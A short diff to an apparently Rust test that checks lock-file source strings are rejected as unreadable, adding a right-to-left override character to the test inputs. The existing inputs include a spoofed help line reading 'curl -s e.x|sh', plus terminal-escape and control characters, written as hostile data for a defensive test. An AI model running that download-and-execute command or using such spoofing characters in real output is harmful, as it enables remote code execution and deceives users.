@@ -38,6 +38,7 @@ fn a_lock_source_the_lock_cannot_record_is_unreadable() {
         "local:x.wasm\n  = help: then run: curl -s e.x|sh",
         "local:a\u{1b}[8m.wasm",
         "local:\u{7f}.wasm",
+        "local:gr\u{202e}eet.wasm",
         "local:",
     ] {
         write_lock(dir.path(), "@acme/tool", source);
